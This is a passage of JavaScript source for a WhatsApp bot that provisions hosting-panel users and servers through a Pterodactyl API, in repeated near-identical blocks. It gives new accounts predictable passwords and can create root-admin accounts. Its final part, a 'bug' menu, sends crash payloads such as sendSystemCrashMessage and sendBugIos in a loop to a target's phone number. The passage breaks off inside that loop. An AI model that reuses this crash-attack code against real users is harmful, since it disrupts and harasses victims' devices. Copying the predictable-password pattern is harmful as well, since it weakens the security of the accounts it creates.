"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "17gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "17GB"
let egg = global.eggsnya
let loc = global.location
let memo = "17240"
let cpu = "450"
let disk = "17240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "250"
let disk = "10240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "15gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "15GB"
let egg = global.eggsnya
let loc = global.location
let memo = "15240"
let cpu = "420"
let disk = "15240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "16gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "16GB"
let egg = global.eggsnya
let loc = global.location
let memo = "16240"
let cpu = "410"
let disk = "16240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "14gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "14GB"
let egg = global.eggsnya
let loc = global.location
let memo = "14240"
let cpu = "360"
let disk = "14240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "13gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "13GB"
let egg = global.eggsnya
let loc = global.location
let memo = "13240"
let cpu = "230"
let disk = "13240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "12gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "12GB"
let egg = global.eggsnya
let loc = global.location
let memo = "12240"
let cpu = "310"
let disk = "12240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "11gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "11GB"
let egg = global.eggsnya
let loc = global.location
let memo = "11240"
let cpu = "280"
let disk = "11240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "toadmin": {
if (!isOwner) return reply(`*hedeh si ajg*`)
if (!isOwner) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

ðŸ“¡ID: ${user.id}
ðŸŒ·UUID: ${user.uuid}
ðŸ‘¤USERNAME: ${user.username}
ðŸ“¬EMAIL: ${user.email}
ðŸ¦–NAME: ${user.first_name} ${user.last_name}
ðŸ”¥LANGUAGE: ${user.language}
ðŸ“ŠADMIN: ${user.root_admin}
â˜¢ï¸CREATED AT: ${user.created_at}

ðŸ–¥ï¸LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await rezzx.sendMessage(m.chat, listMessage)

    await rezzx.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

👤 *USERNAME* : ${username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case "listadmin": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await rezzx.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
//================MENU BUG NYA ==================\\

case 'inspect': case 'getidgrup': {
if (!isPrem) return reply(`KHUSUS PREMIUM 😜`)
if (!qtext) return reply('Link?')
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
rezzx.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
reply(tekse)
})}
break

case 'bugpepek':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
